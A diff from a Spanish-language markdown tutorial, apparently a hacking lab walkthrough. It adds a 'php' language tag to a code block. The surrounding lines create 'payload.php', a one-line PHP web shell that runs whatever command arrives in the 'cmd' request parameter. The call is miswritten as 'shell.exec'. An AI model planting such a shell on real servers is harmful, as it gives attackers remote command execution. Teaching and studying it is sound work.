@@ -119,7 +119,7 @@ Creamos un archivo llamado `payload.php` dónde agregaremos las siguientes líne
 sudo nano payload.php
 ```
 Dónde agregaremos las siguientes líneas.
-```
+```php
 <?php
 echo "<pre>" . shell.exec($_REQUEST['cmd']) . "</pre>";
 ?>
